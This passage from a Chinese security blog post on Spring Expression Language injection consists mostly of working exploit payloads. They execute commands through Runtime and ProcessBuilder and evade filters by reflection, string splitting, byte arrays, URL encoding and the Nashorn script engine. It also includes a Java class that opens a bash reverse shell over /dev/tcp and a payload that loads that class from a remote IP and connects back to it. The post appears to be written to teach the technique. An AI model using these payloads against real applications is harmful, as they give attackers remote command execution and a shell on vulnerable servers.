+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BasicCalc</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">spel</span> <span class="operator">=</span> <span class="string">&quot;T(java.lang.Runtime).getRuntime().exec(\&quot;calc\&quot;)&quot;</span>;  </span><br><span class="line">        <span class="type">ExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();  </span><br><span class="line">        <span class="type">Expression</span> <span class="variable">expression</span> <span class="operator">=</span> parser.parseExpression(spel);  </span><br><span class="line">        System.out.println(expression.getValue());  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740395249483-171c088d-80f8-4f65-b64d-d16b4eae7309.png"></p>
+<h3 id="sm9t8">通过反射调用进行SpEL注入</h3>
+这里和我们上述所利用的方式是相类似的，只是多了一步反射调用
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectBypass</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">spel</span> <span class="operator">=</span> <span class="string">&quot;T(String).getClass().forName(\&quot;java.lang.Runtime\&quot;).getRuntime().exec(\&quot;calc\&quot;)&quot;</span>;  </span><br><span class="line">        <span class="type">ExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();  </span><br><span class="line">        <span class="type">Expression</span> <span class="variable">expression</span> <span class="operator">=</span> parser.parseExpression(spel);  </span><br><span class="line">        System.out.println(expression.getValue());  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="TF3bm">基础Poc与Bypass</h3>
+<h4 id="xjOPg">基础Poc</h4>
+
+<p>基础Poc如下(去除界定符)：</p>
+<p>除了常见的<code>Runtime</code>的命令执行方法还有<code>&lt;font style=&quot;color:rgb(80, 80, 92);&quot;&gt;ProcessBuilder&lt;/font&gt;</code><font style="color:rgb(80, 80, 92);">进行命令执行，后者是前者的基础调用</font></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// PoC原型</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// Runtime</span></span><br><span class="line">T(java.lang.Runtime).getRuntime().exec(<span class="string">&quot;calc&quot;</span>)</span><br><span class="line">T(Runtime).getRuntime().exec(<span class="string">&quot;calc&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">// ProcessBuilder</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(&#123;<span class="string">&#x27;calc&#x27;</span>&#125;).start()</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(&#123;<span class="string">&#x27;calc&#x27;</span>&#125;).start()</span><br></pre></td></tr></table></figure>
+
+<h4 id="xcEpZ">基础Bypass</h4>
+常见的Bypass技巧
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">// 反射调用</span></span><br><span class="line">T(String).getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="string">&quot;calc&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 同上，需要有上下文环境</span></span><br><span class="line">#<span class="built_in">this</span>.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="string">&quot;calc&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 反射调用+字符串拼接，绕过如javacon题目中的正则过滤</span></span><br><span class="line">T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;ex&quot;</span>+<span class="string">&quot;ec&quot;</span>,T(String[])).invoke(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;getRu&quot;</span>+<span class="string">&quot;ntime&quot;</span>).invoke(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>)),<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/C&quot;</span>,<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 同上，需要有上下文环境</span></span><br><span class="line">#<span class="built_in">this</span>.getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;ex&quot;</span>+<span class="string">&quot;ec&quot;</span>,T(String[])).invoke(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;getRu&quot;</span>+<span class="string">&quot;ntime&quot;</span>).invoke(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>)),<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/C&quot;</span>,<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part1</span></span><br><span class="line"><span class="comment">// byte数组内容的生成后面有脚本</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String(<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">99</span>,<span class="number">97</span>,<span class="number">108</span>,<span class="number">99</span>&#125;)).start()</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part2</span></span><br><span class="line"><span class="comment">// byte数组内容的生成后面有脚本</span></span><br><span class="line">T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(<span class="number">99</span>).concat(T(java.lang.Character).toString(<span class="number">97</span>)).concat(T(java.lang.Character).toString(<span class="number">108</span>)).concat(T(java.lang.Character).toString(<span class="number">99</span>)))</span><br></pre></td></tr></table></figure>
+
+<h4 id="csoWt">JavaScript Engine Bypass</h4>
+从别的师傅的博客了解到，可以使用js引擎来进行绕过
+
+<p>我们来获取一下所有js引擎信息</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">       <span class="type">ScriptEngineManager</span> <span class="variable">manager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ScriptEngineManager</span>();</span><br><span class="line">       List&lt;ScriptEngineFactory&gt; factories = manager.getEngineFactories();</span><br><span class="line">       <span class="keyword">for</span> (ScriptEngineFactory factory: factories)&#123;</span><br><span class="line">               System.out.printf(</span><br><span class="line">                   <span class="string">&quot;Name: %s%n&quot;</span> + <span class="string">&quot;Version: %s%n&quot;</span> + <span class="string">&quot;Language name: %s%n&quot;</span> +</span><br><span class="line">                   <span class="string">&quot;Language version: %s%n&quot;</span> +</span><br><span class="line">                   <span class="string">&quot;Extensions: %s%n&quot;</span> +</span><br><span class="line">                   <span class="string">&quot;Mime types: %s%n&quot;</span> +</span><br><span class="line">                   <span class="string">&quot;Names: %s%n&quot;</span>,</span><br><span class="line">                   factory.getEngineName(),</span><br><span class="line">                   factory.getEngineVersion(),</span><br><span class="line">                   factory.getLanguageName(),</span><br><span class="line">                   factory.getLanguageVersion(),</span><br><span class="line">                   factory.getExtensions(),</span><br><span class="line">                   factory.getMimeTypes(),</span><br><span class="line">                   factory.getNames()</span><br><span class="line">               );</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们比较关注的是下面的js引擎名称</p>
+<p><font style="color:rgb(80, 80, 92);">故 </font><code>getEngineByName</code><font style="color:rgb(80, 80, 92);"> 的参数可以填 </font><code>[nashorn, Nashorn, js, JS, JavaScript, javascript, ECMAScript, ecmascript]</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740396153518-c8374c4d-4228-4cea-9817-3ccc39d164de.png"></p>
+<p>我们来举个例子看一下，其中<code>eval</code>方法就已经很明显可以执行代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ScriptEngineManager</span> <span class="variable">sem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ScriptEngineManager</span>();</span><br><span class="line"><span class="type">ScriptEngine</span> <span class="variable">engine</span> <span class="operator">=</span> sem.getEngineByName(<span class="string">&quot;nashorn&quot;</span>);</span><br><span class="line">System.out.println(engine.eval(<span class="string">&quot;2+1&quot;</span>));</span><br></pre></td></tr></table></figure>
+
+<p>那么payload也就很简单就可以构造出来了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// JavaScript引擎通用PoC</span></span><br><span class="line">T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="string">&quot;nashorn&quot;</span>).eval(<span class="string">&quot;s=[3];s[0]=&#x27;cmd&#x27;;s[1]=&#x27;/C&#x27;;s[2]=&#x27;calc&#x27;;java.la&quot;</span>+<span class="string">&quot;ng.Run&quot;</span>+<span class="string">&quot;time.getRu&quot;</span>+<span class="string">&quot;ntime().ex&quot;</span>+<span class="string">&quot;ec(s);&quot;</span>)</span><br><span class="line"> </span><br><span class="line">T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="string">&quot;JavaScript&quot;</span>).eval(<span class="string">&quot;xxx&quot;</span>),)</span><br><span class="line"> </span><br><span class="line"><span class="comment">// JavaScript引擎+反射调用</span></span><br><span class="line">T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="string">&quot;JavaScript&quot;</span>).eval(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;ex&quot;</span>+<span class="string">&quot;ec&quot;</span>,T(String[])).invoke(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;getRu&quot;</span>+<span class="string">&quot;ntime&quot;</span>).invoke(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>)),<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/C&quot;</span>,<span class="string">&quot;calc&quot;</span>&#125;)),)</span><br><span class="line"> </span><br><span class="line"><span class="comment">// JavaScript引擎+URL编码</span></span><br><span class="line"><span class="comment">// 其中URL编码内容为：</span></span><br><span class="line"><span class="comment">// 不加最后的getInputStream()也行，因为弹计算器不需要回显</span></span><br><span class="line">T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="string">&quot;JavaScript&quot;</span>).eval(T(java.net.URLDecoder).decode(<span class="string">&quot;%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29&quot;</span>)),)</span><br></pre></td></tr></table></figure>
+
+<p>最后也是成功执行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740396782521-63a383c6-e9ed-4110-b03a-14438ff3164b.png"></p>
+<h3 id="hZ0Qe">利用类加载攻击</h3>
+<h4 id="oh6sk"><font style="color:rgb(79, 79, 79);">UrlClassloader</font></h4>
+这个方法就是通过远程类加载
+
+<p>首先构造一个恶意类(这里为反弹shell)，并打包为.jar包或者编译为.class</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Exp</span><span class="params">(String address)</span>&#123;</span><br><span class="line">        address = address.replace(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;/&quot;</span>);</span><br><span class="line">        <span class="type">ProcessBuilder</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/&quot;</span>+address+<span class="string">&quot;;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            p.start();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在将编译好的文件放在vps上，并起一个http服务</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server <span class="number">8990</span></span><br></pre></td></tr></table></figure>
+
+<p>payload如下，然后监听2333端口</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">java</span>.net.URLClassLoader(<span class="keyword">new</span> <span class="title class_">java</span>.net.URL[]&#123;<span class="keyword">new</span> <span class="title class_">java</span>.net.URL(<span class="string">&quot;http://101.36.122.13:8990/Exp.jar&quot;</span>)&#125;).loadClass(<span class="string">&quot;Exp&quot;</span>).getConstructors()[<span class="number">0</span>].newInstance(<span class="string">&quot;101.36.122.13:2333&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h4 id="H1gIO">AppClassLoader</h4>
+<font style="color:rgb(77, 77, 77);">获取ClassLoader去加载本地的类</font>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> MalformedURLException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        <span class="comment">//String cmdStr = &quot;new java.net.URLClassLoader(new java.net.URL[]&#123;new java.net.URL(&#x27;http://127.0.0.1:8888/&#x27;)&#125;).loadClass(\&quot;evil\&quot;).getConstructors()[0].newInstance()&quot;;</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmdStr</span> <span class="operator">=</span> <span class="string">&quot;T(java.lang.ClassLoader).getSystemClassLoader().loadClass(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;</span>;</span><br><span class="line">        <span class="type">ExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();<span class="comment">//创建解析器</span></span><br><span class="line">        <span class="type">Expression</span> <span class="variable">exp</span> <span class="operator">=</span> parser.parseExpression(cmdStr);<span class="comment">//解析表达式</span></span><br><span class="line">        System.out.println( exp.getValue() );<span class="comment">//弹出计算器</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740399279702-bbb2fa4f-d226-45b7-bb69-31ed1bb972ea.png"></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>请我一杯咖啡吧！</div>
+  <button>
+    赞赏
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.jpg" alt="Sean 微信">
+        <span>微信</span>
+      </div>
+      <div>
+        <img src="/images/alipay.jpg" alt="Sean 支付宝">
+        <span>支付宝</span>
+      </div>
+
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/" rel="tag"># 表达式注入</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/03/24/FastJson1-2-62-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" rel="prev" title="FastJson 1.2.62-1.2.68反序列化漏洞">
+                  <i class="fa fa-angle-left"></i> FastJson 1.2.62-1.2.68反序列化漏洞
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Sean</span>
+  </div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
